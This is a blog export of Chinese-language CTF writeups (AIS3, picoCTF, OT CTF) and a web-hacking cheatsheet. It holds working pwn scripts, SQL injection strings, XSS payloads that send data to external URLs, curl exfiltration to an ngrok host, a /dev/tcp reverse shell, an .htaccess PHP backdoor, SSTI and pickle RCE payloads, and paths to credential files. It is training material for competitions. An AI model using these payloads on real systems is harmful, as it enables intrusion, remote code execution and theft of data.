{"posts":[{"title":"2023 AIS3 Pre-Exam writeup","text":"MiscWelcomeAre you not a robot ? FLAG Format: ^AIS3{[A-Z0-9+-*/!?-]+}$ Author: nella17 點開pdf，flag直接寫在上面了，一開始以為-是_結果浪費一堆時間 AIS3{WELC0ME-T0-2023-PRE-EXAM-&amp;-MY-FIRST-CTF} RobotAre you a robot? Note: This is NOT a reversing or pwn challenge. Don't reverse the binary. It is for local testing only. You will actually get the flag after answering all the questions. You can practice locally by running ./robot AIS3{fake_flag} 127.0.0.1 1234 and it will run the service on localhost:1234. Author: toxicpie nc chals1.ais3.org 12348 機器人會問你三十題數學，可以直接寫Python用eval()解在discord看到有人說直接用手解，牛皮 exploit code1234567891011121314import pwnimport timeio=pwn.remote(&quot;chals1.ais3.org&quot;,12348)print(io.recvuntil(&quot;!&quot;))time.sleep(0.5)for i in range(30): print(f&quot;solving..{i+1}&quot;) string=io.recv().decode() string=string.strip(&quot; &quot;).strip(&quot;\\n&quot;) print(string,eval(string)) io.sendline(str(eval(string))) time.sleep(0.5)io.interactive() AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}被罵了 PWNSimply PwnThe simplest pwn nc chals1.ais3.org 11111 經典buffer overflow 先用gdb觀察ni到read附近 可以發現輸入變數存在rsi=rbp-0x50+0x9=rbp-0x47 所以必須墊0x47+8byte(RSP)+address，剛好可以覆蓋return address 直接讓程式跳到shellcode exploit code12345import pwnio=pwn.remote(&quot;chals1.ais3.org&quot;,11111)payload=b&quot;a&quot;*(0x4f)+pwn.p64(0x4017a5)io.sendline(payload)io.interactive() AIS3{5imP1e_Pwn_4_beGinn3rs!} WebLogin PanelLogin Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入 admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。 你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的 攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。 當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明 你的成功。 Author: Ching367436 http://chals1.ais3.org:8000/ 直接讀source code 1db.get(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'` 聞起來就很有SQL injection的味道 Bypass Login Page注入username 1username=' or 'a'='a 中計直接被Redirect到rickroll ok不然改注password 1username=admin&amp;password=' or 'a'='a 成功進入之後還有2fa認證，要輸入2fa code才能進到dashboard看flag，但是仔細看其實驗證完之後他也只是redirect到/dashboard而已，所以直接存取/dashboard即可 AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–} E-Portfolio babyAIS3 E-Portfolio 是一個學習成就展示平台，讓使用者可以建立並分享他們在 AIS3 的學習成果和專 案作品。其中，網站提供了一個「Share your portfolio with admin」的功能，讓使用者可以將自 己的作品集分享給管理員。 你需要找出一個前端漏洞，當你分享作品集給管理員時，能夠竊取 admin 的旗幟。你可以透過探索網站 的前端程式碼，找到適當的方式來觸發漏洞並取得旗幟。 請注意，你需要在漏洞設計中保持合法並遵循道德原則。請勿以任何方式傷害網站的正常運作或使用者的隱私。 對了，按下「Share your portfolio with admin」的按鈕的時候，admin 會去拜訪的頁面會是 http://url/share?username={按下那個按鈕的使用者名稱}。 Author: Ching367436 http://chals1.ais3.org:8880/ 看到share to admin就知道這是csrf題目先戳戳看 測試XSS1&lt;script&gt;alert()&lt;/script&gt; 沒反應，因為寫上文字是使用innerHTML，所以對 &lt;script&gt; 標籤不起作用 1234567if (data.success) { username.innerHTML = data.data.username about.innerHTML = data.data.about avatar.src = data.data.avatar } else { alert(data.message) } 用 &lt;img src&gt; 試試 1&lt;img src=&quot;123&quot; onerror=alert()&gt; 果然出現XSS 嘗試當cookie小偷一開始的思路是當cookie小偷，然後用admin登入看flag藏在哪 1234&lt;img src='' onerror=fetch('https://script.google.com/macros/s/\\ AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\\ pW0B8vTj0lureCaOdOA/exec?\\ text=cookie:'+encodeURI(document.cookie))&gt; ![](https://hackmd.io/_uploads/B1syQsNBn.png =50%x)因為有設定HTTP only所以偷不到cookie(後來發現偷到也沒用，flag不在admin的頁面裡面) 嘗試直接偷api內容看sauce code會發現其實flag寫在admin的密碼裡面，然後密碼又透過api/portfolio傳遞 ok開偷 123456789&lt;img src=&quot;123&quot; onerror=&quot;fetch('api/portfolio') .then(response =&gt;response.text()).then(text=&gt;{ var url= 'https://script.google.com/macros/s/\\ AKfycbxFRZIq7zd9X5gpd9MNCIe9m6d_GwrT3kY9vkVH8hPXic7pbr-\\ pW0B8vTj0lureCaOdOA/exec?text=' fetch(url+encodeURI(text)) })&quot;&gt; ![](https://hackmd.io/_uploads/S19GtoVrh.png =50%x)在瀏覽器上測試成功，但share to admin甚麼事都沒發生 網站沒有設定CSP，所以應該是機器人沒辦法訪問外網 嘗試寫入自己的page沒辦法直接用webhook就變很複雜了 改變絲路:偷到api/portfolio-&gt;登入自己的帳號-&gt;寫入textarea-&gt;儲存 創建登入form 1234&lt;form id=form action=&quot;/api/login&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt; &lt;input name=&quot;username&quot; value=&quot;test123&quot;&gt; &lt;input name=&quot;password&quot; value=&quot;test&quot;&gt;&lt;/form&gt; 先偷api/portfolio再submit表單切成自己帳號，最後改textarea、click save 123456789101112&lt;img src=&quot;123&quot; onerror=&quot;fetch('http://web:8000/api/portfolio') .then(response =&gt;response.text()).then(text=&gt;{ form.submit() setTimeout(function() { console.log('123'); }, 1000); var win=window.open('http://web:8000/portfolio') setTimeout(() =&gt; { win.document.querySelector('textarea[id=about]').value = text; win.document.querySelector('button[id=save]').click() }, 1000) })&quot;&gt; AIS3{&lt;img src=x onerror=’fetch(…} ReverseSimply ReverseJust reverse it! 先執行看看 丟ghidra這邊有一個verify函式判斷key是否正確 解題絲路因為verify()的迴圈每跑一圈就會檢查一個char，一直到local_c=0x22 然後return true; 所以可以brute force 跑每個字元然後看迴圈有沒有炸掉 exploit code12345678910111213141516171819202122import pwnimport timeio=pwn.process(&quot;gdb&quot;)io.sendline(&quot;file rev&quot;)io.sendline(&quot;start&quot;)io.sendline(&quot;b *0x5555555551fb&quot;) #把breakpoint 設在迴圈裏面，如果沒有停代表是錯的io.recvrepeat(timeout=1)flag=&quot;AIS3{&quot;while 1: for i in range(0x20,0x7E): print(&quot;trying..&quot;,flag+chr(i)) io.sendline(f&quot;set args {flag+chr(i)}&quot;) io.sendline(&quot;run&quot;) for j in range(len(flag)+1): io.sendline(&quot;c&quot;) io.recvrepeat(timeout=0.3).decode() io.sendline(&quot;x/x $rbp-0x4&quot;) string=io.recv().decode() if &quot;No&quot; not in string: flag+=chr(i) break AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!} CryptoFernet你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。 你需要解開被加密的檔案，否則事情就大條了！ flag format : FLAG{xxx} Auther : Richard ( dogxxx) 看code123456789101112131415161718192021import osimport base64from cryptography.fernet import Fernetfrom Crypto.Hash import SHA256from Crypto.Protocol.KDF import PBKDF2from secret import FLAGdef encrypt(plaintext, password): salt = os.urandom(16) key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) ciphertext = f.encrypt(plaintext.encode()) return base64.b64encode(salt + ciphertext).decode()# Usage:leak_password = 'mysecretpassword'plaintext = FLAG# Encryptciphertext = encrypt(plaintext, leak_password)print(&quot;Encrypted data:&quot;,ciphertext) 絲路密碼都給你了所以反著解密就好了 加密流程是:產生salt-&gt;產生key-&gt;用key加密flag-&gt;把salt+ciphertext用base64 encode起來所以其實salt也給你了就是base64 decode後的前16個char decrypt code解密流程:base64 decode-&gt;取得salt、ciphertext-&gt;用password、salt重建key-&gt;用key解密ciphertext 123456789101112131415161718192021import osimport base64from cryptography.fernet import Fernetfrom Crypto.Hash import SHA256from Crypto.Protocol.KDF import PBKDF2cipher='''iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj'''cipher=cipher.encode()cipher=base64.b64decode(cipher)salt=cipher[:16]cipher=cipher[16:]print(salt)print(cipher)leak_password = 'mysecretpassword'key = PBKDF2(leak_password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) plaintext=f.decrypt(cipher)print(plaintext) FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!!!!!}","link":"/2024/02/07/2023-AIS3-Pre-Exam-writeup/"},{"title":"2024 AIS3 EOF CTF Qual writeup","text":"webnslookup final AIS3{jUST_3a$y_cOMmaND_INj3c7I0N} 有command injection，用``把指令包起來，但是會有一個問題就是他不會回傳結果， 1curl webhook.trianglesnake.com/?text=123 呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來 因為有WAF限制flag、*，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag 12`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode &quot;$(find / -maxdepth 1 -type f -exec grep 'ais3' {} +)&quot;` internal AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE} 沒辦法碰到/flag但是如果由內網機器送redirect請求並包含X-Accel-Redirectheader就可以穿透。 這題在考crlf截斷，截斷之後可以header injection 1http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag copypasta題目有sql injection，用sqlmap dump出所有column後可以直接存取/posts/flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出app.secret_key-&gt;偽造cookie-&gt;存取flag頁面 透過sql injection創造貼文1234#source codetmpl = db().cursor().execute( f&quot;SELECT * FROM copypasta_template WHERE id = {id}&quot; ).fetchone() 這裡很明顯留了一個洞給我們 12#payload?id=1,'a','{field.__class__....}' 此時下面進行format string的時候就會被injection 1res = content.format(field=request.form) 這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到app.secret_key reversestateful AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer} 把整個流程反過來做一次 真reversed engineering先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來 1234567891011121314151617string = &quot;&quot;&quot;3618225054(k_target)2057902921(k_target)671274660(k_target)......557589375(k_target)3420754995(k_target)3648003850(k_target)1978986903(k_target)&quot;&quot;&quot;lst = string.split('\\n')lst.reverse()print(lst)for i in lst: print('state_'+i+';') 把每個狀態機的function+改成-，然後把k_target逆向回推 12345678910111213141516171819202122232425262728293031323334353637// Hello world! Cplayground is an online sandbox that makes it easy to try out// code.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int main() { int local_14 = 1; int local_10 = 0; unsigned local_c = 0xd7a9bb9e; bool bVar1 = false; char k_target[43] ={ 38, 75, ... 128, 101, -20, 125}; state_1978986903(k_target);state_3648003850(k_target);state_3420754995(k_target);state_557589375(k_target);...state_2057902921(k_target);state_3618225054(k_target); for (int i=0;i&lt;44;i++){ printf(&quot;%c&quot;,k_target[i]); } return 0;} 基本上就是反著做一遍","link":"/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/"},{"title":"OT CTF writeup","text":"惡意軟體分析 [name=trianglesnake]flag:||10.15.1.69:3128||難度:中 打開ida pro 查看import table 查看是否有網路連線相關api 查看 WinHttpOpen functoin的Reference 在edi中找到中繼伺服器ip和port 惡意軟體分析2 [name=trianglesnake]flag:||flag{5.39.218.152}|| 加密系統 [name=trianglesnake]flag:||flag_EnCryp1||難度:難 使用factordb.com分解n 因為e是2，所以不可能為RSA，猜測為rabin算法 有$p、q$了，所以順著把$m_p、m_q$求出來，會有四組明文 找可以讀的明文就是flag了 工業app分析 [name=trianglesnake]flag:||Flag {g6ghfchijv55fhh8gdd}||難度:易 題目有附apktool，用apktool decode apk 摸一摸就找到flag了 Level_L] Modbus異常封包 [name=trianglesnake]flag:||THISISAOTCTFEASYFLAG||難度:易 題目說是意外擲回，直接用filter過濾exception 1modbus.exception_code 查看request內容 Level_L] Modbus異常封包 [name=trianglesnake]flag:||AN APPLE A DAY KEEPS THE DOCTOR AWAY||難度:易 藏訊息發給PLC，若沒有拆開封包length一定會很長 找length最長的封包 比別的封包多一坨hex的資料 把hex轉成ascii，得到flag","link":"/2023/12/20/OT-CTF-writeup/"},{"title":"CTF Cheatsheet - Web","text":"Information Leak.git / .svn / .bzr版本控制系統 .git洩漏可用scrabble將整個.git資料夾下載下來並用git 還原 1./scrabble http://www.example.com/ Google Hacking123site:www.example.comintext:&quot;管理介面&quot;filetype:sql GHDB robots.txt .DS_Store .index.php.swp Backup file PHP 弱型別判斷 PHP弱型別的安全問題詳細總結 md5()&amp;sha1()12345678md5(array()) ==sha1(array())//true=&gt;error=errormd5(240610708)==0 //true/*md5(240610708)=&gt;'0e462097431906509019562988736854'在弱型別判斷中會做為科學記號和int比較*/sha1('aa3OFF9m')=&gt;'0e36977786278517984959260394024281014729' https://www.cnblogs.com/shijiahao/p/12638484.html https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9 header竄改可偽造ip相關 X-Forward-For Client-IP X-Real-IP SSRFgopher 用法1234567891011gopher://host:port/_HTTPRequest//example POST request:*gopher://192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1Host:127.0.0.1:1000Content-type:application/x-www-form-urlencodedContent-Length:20username=admin&amp;password=bupt666//換行要用%0D%0A(\\r\\n)* 備註：發起POST的四個必要欄位POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11 gopher POST request payload 1gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A https://hackmd.io/@Lhaihai/H1B8PJ9hX LFI&amp;RFIphp require()&amp;include()偽協議123456789//phpfilterindex.php?file=php://filter/read=convert.base64-encode/resource=target.php//phar 打包成zip下載index.php?file=phar://test.zip/target.php//data:URL schemaindex.php?file=data:text/plain,&lt;?php system('ls');?&gt;index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==** data:URL schema更多用法 1234567891011121314#敏感檔案/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 SESSION植入WebShell若session可寫入，可以利用LFI執行php 12寫入&lt;?php system(&quot;ls&quot;);?&gt;index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt; session_path可由phpinfo內找到session.save_path，若無則放在/tmp內 /var/lib/php/session session檔名為sess_&lt;session id&gt; freebuf-LFI .htaccess可影響apache伺服器中資料夾內的檔案 利用指定404、403等錯誤響應文件達成LFI 12ErrorDocument 404 /flag.txtErrorDocument 404 /shell.php 強制解析非php檔案造成RCE 1AddType application/x-httpd-php .txt 將.htaccess本身作為php執行後門 12php_value auto_prepend_file .htaccess#&lt;?php echo system($_GET['cmd']); ?&gt; #為.htaccess的註解符號 若有WAF則可用\\換行繞過 123p\\hp_value auto_prepend_file .htaccess#&lt;?=echo system($_GET['cmd']); ?&gt; 遇到\\時，會接續下一行 https://blog.csdn.net/solitudi/article/details/116666720 Serialize&amp;Deserialize呼叫反序列化時，可能呼叫一些Magic Method 序列化 Value Serialize(PHP) 8459302 i:8459302; TRUE b:1; NULL N; [’x’,1] a:2:{i:0;s:1:”x”;i:1;i:1;} PHP Object的序列化 1234567new Cat(&quot;kitten&quot;) =&gt;O:3:&quot;Cat&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;kitten&quot;;}class Cat{ public $a; =&gt;{s:1:&quot;a&quot;;.....} private $b; =&gt;{s:6:&quot;\\x00Cat\\x00b&quot;;.....} protected $c; =&gt;{s:4:&quot;\\x00*\\x00c&quot;;.....}} 反序列化1234567PHP Magic Method在指定時機自動呼叫magic method__destruct() //Object 被銷毀或garbage collection__wakeup() //unserialize時觸發__call() //被呼叫不存在方法時觸發__toString() //被當成string處理時觸發(如 echo) 12345678**Python Pickle**pickle.dumps()會將資料序列化可寫payloadsimport subprocessclass payload(object): def __reduce__(self): return (subprocess.check_output,(['cat','/flag_5fb2acebf1d0c558'],))再想辦法把payload()塞進dumps裡面 Phar與反序列化1 SSTI(Server Side Template Injection) python Flask預設模板為Jinja2 1234567891011render_template_string(template)#可做一些簡單運算template={{7*7}} =&gt;49{%for item in item_list %} {{ item }}{% if not loop.last %},{% endif %}{%-endfor-%}'''可以import os os.system()嗎? 不行，code是放在sandbox中跑的但可以用config.from_pyfile(filename)執行任意python檔案''' 使用_mro_(Method Resolution Order) bypass Python的Sandbox 12345678910111213141516171819202122[].__class__ =&gt;&lt;class 'list'&gt;#對object 查詢method[].__class__.__mro__ =&gt;(&lt;class 'list'&gt;,&lt;class 'object&gt;)#_mro_可查詢解析物件順序，此時可以發現所有物件的底層皆為object[].__class__.__base__ =&gt;&lt;class 'object'&gt;#_base_可返回最底層的method,所以返回object[].__class_.__base_.__subclasses__()#_subclasses_直接返回所有subclasses，猛了object在最底層，所以所有物件都會return[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class 'os._wrap_close'&gt;#os出現了[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;返回所有可被global調用的method{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('ls')}}#os.system被A出來了{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}#回傳結果 更多奇技淫巧:https://tw511.com/a/01/48066.html SQL injectionhttps://www.796t.com/content/1545706659.htmlhttps://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/ sqlmap:::infoOptions: -h, –help Show basic help message and exit -hh Show advanced help message and exit –version Show program’s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) -g GOOGLEDORK Process Google dork results as target URLs Request: These options can be used to specify how to connect to the target URL --data=DATA Data string to be sent through POST (e.g. &quot;id=1&quot;) --cookie=COOKIE HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;) --random-agent Use randomly selected HTTP User-Agent header value --proxy=PROXY Use a proxy to connect to the target URL --tor Use Tor anonymity network --check-tor Check to see if Tor is used properly Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --dbms=DBMS Force back-end DBMS to provided value Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH.. SQL injection techniques to use (default &quot;BEUSTQ&quot;) Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --passwords Enumerate DBMS users password hashes --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate Operating system access: These options can be used to access the back-end database management system underlying operating system --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC General: These options can be used to set some general working parameters --batch Never ask for user input, use the default behavior --flush-session Flush session files for current target Miscellaneous: These options do not fit into any other category --wizard Simple wizard interface for beginner users ::: 常見waf1escape()-&gt;被轉成%XX，@* _ + - . /不編碼 waf繞過123'弄不出來的時候可以嘗試兩個urlencode合在一起%bf%27、%df%27、%aa%27 Reversed Shell1234最經典nc -klvp [port] #attacker's host/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 #victim Commandline Injection截斷指令最基本的截斷可用;達成，也可使用 cmd1&amp;&amp;cmd2當cmd1 執行成功時執行cmd2 cmd1&amp;cmd2簡單拼接，無論cmd1執行成功與否都會執行cmd2 cmd1||cmd2當cmd1執行失敗時執行`cmd2 cmd1|cmd2將cmd1的執行結果以pipeline塞給cmd2 空格繞過 使用&lt;&gt;繞過 cat&lt;flag cat&lt;&gt;flag {cat,flag} 使用特殊變量$IFS繞過(預設是空格) cat$IFS./flag cat$IFS\\flag 過濾繞過 regex繞過 /usr/bin/ca? flag 反斜線繞過 ca\\t fl\\ag 空變量繞過 ca${Z}t flag 一些猛料 https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003https://blog.csdn.net/m0_61011147/article/details/126722464 一些會一直旺季的東東 更多筆記https://github.com/splitline/How-to-Hack-Websites https://github.com/splitline/My-CTF-Challenges/ [資安新手入門手冊] Web Security 領航之路 简介 - CTF Wiki https://github.com/w181496/Web-CTF-Cheatsheet","link":"/2024/02/12/CTF-Cheatsheet-Web/"},{"title":"picoCTF 2023 writeup","text":"Binary ExploitationhijackingAUTHOR: THEONESTE BYAGUTANGAZA Description Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with. Through Social engineering, we've got the credentials to use on the server. SSH is running on the server. 隨便逛逛發現/challenge資料夾很可疑，但是沒辦法cd進去 查看sudo 發現使用者可以用sudo權限使用vi exploit123sudo vi:shell privilege escalation了，再來就直接A進去/challenge/把flag撈出來就好 picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866} 原本解法這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼 只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py 先ls -al發現有一個.server.py cat .server.py 1234567891011import base64import osimport socketip = 'picoctf.org'response = os.system(&quot;ping -c 1 &quot; + ip)#saving ping details to a variablehost_info = socket.gethostbyaddr(ip)#getting IP from a domainehost_info_to_str = str(host_info[2])host_info = base64.b64encode(host_info_to_str.encode('ascii'))print(&quot;Hello, this is a part of information gathering&quot;,'Host: ', host_info) vim .server.py沒辦法動.server.py，因為他是readonly，但是權限沒有設定到base64.py 在import file裡面加料vim /usr/lib/python3.8/base64.py 1234import oswhile 1: cmd=input() print(os.popen(cmd).read()) get shell 1sudo python3 .server.py ForensicshidemeAUTHOR: GEOFFREY NJOGU Description Every file gets a flag. The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye here. 下載下來發現是一張圖片看一看感覺很正常 用exiftool看了一下沒有把flag藏在某個欄位裡 strings flag.png看看發現裡面有長得很像路徑的東東 直接把flag.png當成zip解壓縮看看 1unzip flag.png 得到半張flag picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717} FindAndOpenAUTHOR: MUBARAK MIKAIL Description Someone might have hidden the password in the trace file. Find the key to unlock this file. This tracefile might be good to analyze. 這題給了兩個檔案，第一個是flag.zip和dump.pcap。嘗試解壓縮flag.zip，發現需要密碼 先從dump.pcap下手看看用wireshark打開dump.pcap 隨便看幾個封包後發現都有明文 找到一個超可疑的封包，=結尾很可能是base64編碼的填充字元 decode後得到半截flag This is the secret: picoCTF{R34DING_LOKd_ 回到flag.zip，直接通靈把第一段flag當密碼 picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878} ?? General Skillsmoney-wareAUTHOR: JUNI19 Description Flag format: picoCTF{Malwarename} The first letter of the malware name should be capitalized and the rest lowercase. Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of? Google 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX 找到CNBC的新聞 picoCTF{Petya} 水爛 repetitionsAUTHOR: THEONESTE BYAGUTANGAZA Description Can you make sense of this file? Download the file here. 下載enc_flag 12345VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVhRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNkMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVWVkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZsaGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== ==經典base64 decode後 1234VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVXbUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdWMlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhibTkzVDFWT2JsQlVNRXNLCg== 再decode 123V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVRbHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hSbVZyTVhSWGFteEVXbm93T1VOblBUMEsK de 12WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lVWGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K deeee 12Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZNV1V3TW1Fek1tWjlDZz09Cg== eeeeeeee 1cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg== aaaaaaaaaa 1picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} PermissionsAUTHOR: GEOFFREY NJOGU Description Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 53849 picoplayer@saturn.picoctf.net Password: x+T6aPgE4- Can you login and read the root file? picoCTF{uS1ng_v1m_3dit0r_f6ad392b} 水爛 chronoAUTHOR: MUBARAK MIKAIL Description How to automate tasks to run at intervals on linux servers? Use ssh to connect to this server: Server: saturn.picoctf.net Port: 50602 Username: picoplayer Password: tPmsUpiHeZ picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71} ? uselessAUTHOR: LOIC SHEMA Description There's an interesting script in the user's home directory Additional details will be available after launching your challenge instance. picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173} SpecialAUTHOR: LT 'SYREAL' JONES Description Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details. Additional details will be available after launching your challenge instance. 這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫ls會變Iscat會變Cat，但如果不是第一個字母就不會變大寫，所以可以用cat指令用; 搭配Regex Command Injection 1cat;cat * 發現目錄下面有一個資料夾blargh 1cat;cat blargh/* picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59} Reverse EngineeringReverseAUTHOR: MUBARAK MIKAIL Description Try reversing this file? Can ya? I forgot the password to this file. Please find it for me? 題目給了一個檔案ret，執行後要輸密碼 丟GDB 1234start cctrl^Cni到死 在呼叫strcmp比對密碼時把rsi dump出來，得到前半截flag picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528 重新執行ret，輸入密碼 picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289} Web ExploitationMore SQLiAUTHOR: MUBARAK MIKAIL Description Can you find the flag on this website. Additional details will be available after launching your challenge instance. Bypass login進入網頁，經典登入介面 12username=admin&amp;password=' or 'a'='a 題目很貼心把query都print出來給你 調整一下 12username=123&amp;password=' or 1=1;-- 進入之後有一個搜尋頁面 測試有幾個欄位1searchInput=' union select 1,2,3;-- dump Table1searchInput=' or 'a'='a 沒看到flag，可能在別的table 1' union select group_concat(sql),2,3 from sqlite_master WHERE type='table';-- 現在知道flag應該在more_table的flag_TEXT欄位 1' union select flag,2,3 from more_table;-- picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} MatchTheRegexAUTHOR: SUNDAY JACOB NWANYIM Description How about trying to match a regular expression Additional details will be available after launching your challenge instance. 一開始沒看hint不知道到底要幹嘛 結果是要match^p.....F!? picoCTF{succ3ssfully_matchtheregex_9080e406} 世紀水題 findmeAUTHOR: GEOFFREY NJOGU Description Help us test the form by submiting the username as test and password as test! 